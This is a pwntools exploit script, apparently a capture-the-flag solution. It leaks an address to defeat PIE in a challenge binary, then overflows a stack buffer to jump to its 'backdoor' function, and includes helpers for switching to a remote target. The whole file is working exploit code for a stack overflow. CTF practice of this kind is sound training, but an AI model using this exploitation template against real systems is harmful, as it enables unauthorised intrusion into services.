from pwn import *
context(arch='amd64', os='linux')

file_name = './pwn'

elf = ELF(file_name)

gdb_   = 1 if ('gdb' in sys.argv)        else 0
switch = 1 if ('remote' in sys.argv)     else 0
debug  = 0 if ('deoff'  in sys.argv)     else 1

if switch:
    target = ''
    port   = 0
    p = remote(target, port)
else:
    p = process(file_name)

if debug:
    context(log_level='debug')

if gdb_ and switch == 0:
    gdb.attach(p)
    pause()

def s(data):             return p.send(data)
def sa(delim, data):     return p.sendafter(delim, data)
def sl(data):            return p.sendline(data)
def sla(delim, data):    return p.sendlineafter(delim, data)
def r(numb=4096):        return p.recv(numb)
def ru(delim, drop=True):return p.recvuntil(delim, drop)
def rl():                return p.recvline()
def ra(t=None):          return p.recvall(timeout=t)
def cl():                return p.close()
def it():                return p.interactive()
def uu64(data):          return u64(data.ljust(8, b'\x00'))
def lg(name, data):      return log.success(name + ': ' + (hex(data) if isinstance(data, int) else data.decode(errors='ignore') if isinstance(data, bytes) else str(data)))
def menu(idx, pmt='>'):  return sla(pmt.encode() if isinstance(pmt, str) else pmt, str(idx).encode())
def ntpie(leak, offset, name='PIE'): return setattr(elf, 'address', leak - (elf.sym[offset] if isinstance(offset, str) else offset)) or lg(name, elf.address)
def ga(delim=b'\n', name='Leak'):    return [lg(f'{name}[{i}]', x) or x for i, x in enumerate([int(a, 16) for a in re.findall(b'0x[0-9a-fA-F]+', ru(delim))])]
def fill(num, content=b'A'):         return (content.encode() if isinstance(content, str) else content) * num
def search(s):           return next(elf.search(s if isinstance(s, bytes) else s.encode()))
#################################################################################

menu(1)
[leak] = ga()
piebase = leak - 0x4010
ntpie(leak,0x4010)
backdoor = elf.sym['backdoor']
ret = search(asm('ret'))

menu(2)

payload = flat([
    fill(0x20),
    "xdulaker"
])
sa(b"Hey,what's your name?!",payload)

menu(3)
payload1 = flat([
    fill(0x30+8),
    ret,
    backdoor
])
sa(b"welcome,xdulaker",payload1)
it()
